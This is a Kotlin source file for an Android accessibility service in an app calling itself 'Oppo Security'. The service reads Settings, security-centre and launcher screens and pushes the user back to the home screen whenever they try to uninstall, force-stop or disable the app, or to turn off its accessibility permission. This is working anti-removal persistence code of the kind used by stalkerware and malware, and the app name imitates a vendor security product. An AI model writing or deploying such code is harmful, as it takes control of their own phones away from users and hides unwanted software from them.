package com.yourdomain.throttlingapp

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class ProtectionAccessibilityService : AccessibilityService() {

    private val myAppName = "Oppo Security" // Match app title
    private val settingsPackageName = "com.android.settings"

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "ProtectionAccessibilityService connected and actively listening.")
    }

    private val targetSettingsPackages = setOf(
        "com.android.settings",
        "com.coloros.safecenter",
        "com.oplus.safecenter",
        "com.android.settings",
        "com.coloros.safecenter",
        "com.oplus.safecenter",
        "com.nearme.romupdate",
        "com.oppo.launcher",       // Oppo / ColorOS Launcher
        "com.android.launcher3",   // Stock / Generic Android Launcher
        "com.google.android.apps.nexuslauncher", // Pixel Launcher
        "android"                  // System confirmation dialogs
    )

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        if (targetSettingsPackages.contains(packageName)) {
            val rootNode = rootInActiveWindow ?: return
            if (isAttemptingTamper(rootNode)) {
                Log.w(TAG, "Tamper attempt blocked! Sending to HOME.")
                performGlobalAction(GLOBAL_ACTION_HOME)
            }
        }
        
        // Intercept when user is inside system Settings
        if (packageName == settingsPackageName) {
            Log.d(TAG, "Settings event detected: eventType=${event.eventType}, className=${event.className}")

            val rootNode = rootInActiveWindow
            if (rootNode == null) {
                Log.d(TAG, "rootInActiveWindow is null. Skipping node inspection.")
                return
            }

            if (isAttemptingTamper(rootNode)) {
                Log.w(TAG, "Tamper attempt detected in Settings! Executing GLOBAL_ACTION_HOME.")
                performGlobalAction(GLOBAL_ACTION_HOME)
            }
        }
    }

    private fun isAttemptingTamper(node: AccessibilityNodeInfo): Boolean {
        // 1. Check if user opened App Info or Settings page referencing this app
        val appMatches = node.findAccessibilityNodeInfosByText(myAppName)
        Log.d(TAG, "Searching for app name '$myAppName': found ${appMatches.size} node(s).")

        // Catch common uninstall/force-stop text variations across ROMs
        val keywords = listOf("Uninstall", "Force stop", "Disable", "Remove", "App info", "Accessibility")
        
        for (keyword in keywords) {
            val matches = node.findAccessibilityNodeInfosByText(keyword)
            if (matches.isNotEmpty() && appMatches.isNotEmpty()) {
                Log.w(TAG, "Matched keyword '$keyword' alongside app name. Blocking access.")
                return true
            }
        }

        // Match exact phrases used in system confirmation dialogs
        val uninstallDialogText = node.findAccessibilityNodeInfosByText("Do you want to uninstall this app?")
        val genericUninstall = node.findAccessibilityNodeInfosByText("Uninstall")

        if (uninstallDialogText.isNotEmpty() || (appMatches.isNotEmpty() && genericUninstall.isNotEmpty())) {
            Log.w(TAG, "Uninstall prompt detected for Oppo Security!")
            return true
        }

        // Next
        if (appMatches.isNotEmpty()) {
            Log.i(TAG, "App match found for '$myAppName'. Evaluating specific tamper criteria...")

            // 2. Check if user is inside Accessibility settings referencing this service
            val accessibilityMatches = node.findAccessibilityNodeInfosByText("Accessibility")
            if (accessibilityMatches.isNotEmpty()) {
                Log.w(TAG, "User accessed Accessibility settings page referencing '$myAppName'. Triggering protection.")
                return true
            }

            // 3. Check for specific dangerous action buttons
            val forceStopButtons = node.findAccessibilityNodeInfosByText("Force stop")
            val uninstallButtons = node.findAccessibilityNodeInfosByText("Uninstall")
            val disableButtons = node.findAccessibilityNodeInfosByText("Disable")

            val forceStopCount = forceStopButtons.size
            val uninstallCount = uninstallButtons.size
            val disableCount = disableButtons.size

            Log.d(TAG, "Button matches: Force Stop=$forceStopCount, Uninstall=$uninstallCount, Disable=$disableCount")

            if (forceStopCount > 0 || uninstallCount > 0 || disableCount > 0) {
                Log.w(TAG, "Dangerous action button detected while on '$myAppName' page. Triggering protection.")
                return true
            }

            // Fallback: Default block if the user is on our app's specific Settings/App Info page
            Log.w(TAG, "User viewing '$myAppName' Settings page. Triggering baseline protection.")
            return true
        }

        return false
    }

    override fun onInterrupt() {
        Log.w(TAG, "ProtectionAccessibilityService interrupted by system.")
    }

    override fun onDestroy() {
        Log.i(TAG, "ProtectionAccessibilityService destroyed.")
        super.onDestroy()
    }

    companion object {
        private const val TAG = "ProtectionAccessService"
    }
}